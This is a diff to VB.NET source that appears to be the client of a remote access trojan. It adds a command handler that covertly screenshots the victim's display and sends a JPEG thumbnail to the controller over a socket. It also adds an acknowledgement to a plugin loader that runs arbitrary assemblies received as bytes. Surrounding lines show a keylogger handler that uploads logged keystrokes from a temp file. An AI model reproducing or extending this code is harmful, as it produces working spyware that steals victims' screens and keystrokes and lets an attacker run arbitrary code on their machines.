@@ -18,6 +18,26 @@
                     Case "!P"
                         C_Socket._stop = True
 
+                    Case "!CAP"
+                        Try
+                            Dim bounds As Drawing.Rectangle = Windows.Forms.Screen.PrimaryScreen.Bounds
+                            Dim image As New Drawing.Bitmap(Windows.Forms.Screen.PrimaryScreen.Bounds.Width, bounds.Height, Drawing.Imaging.PixelFormat.Format16bppRgb555)
+                            Dim _g As Drawing.Graphics = Drawing.Graphics.FromImage(image)
+                            Dim blockRegionSize As New Drawing.Size(image.Width, image.Height)
+                            _g.CopyFromScreen(0, 0, 0, 0, blockRegionSize, Drawing.CopyPixelOperation.SourceCopy)
+                            Dim MM As New IO.MemoryStream
+                            Dim THU As New Drawing.Bitmap(256, 156)
+                            Dim G As Drawing.Graphics = Drawing.Graphics.FromImage(THU)
+                            G.DrawImage(image, New Drawing.Rectangle(0, 0, 256, 156), New Drawing.Rectangle(0, 0, image.Width, image.Height), Drawing.GraphicsUnit.Pixel)
+                            THU.Save(MM, System.Drawing.Imaging.ImageFormat.Jpeg)
+                            C_Socket.Send("#CAP" & SPL & C_ID.Bot & SPL & Text.Encoding.Default.GetString(MM.ToArray))
+                            MM.Dispose()
+                            THU.Dispose()
+                            G.Dispose()
+                            image.Dispose()
+                        Catch ex As Exception
+                        End Try
+
                     Case "KL"
                         C_Socket.Send("KL" + SPL + C_ID.HWID + SPL + IO.File.ReadAllText(IO.Path.GetTempPath + "\" + IO.Path.GetFileNameWithoutExtension(Windows.Forms.Application.ExecutablePath) + ".tmp"))
 
@@ -43,6 +63,8 @@
 
         Public Shared Sub Plugin(ByVal B() As Byte, Optional CMD As String = Nothing)
             Try
+                C_Socket.Send("OK")
+
                 For Each Type_ As Type In AppDomain.CurrentDomain.Load(B).GetTypes
                     For Each GM In Type_.GetMethods
                         If GM.Name = "CN" Then
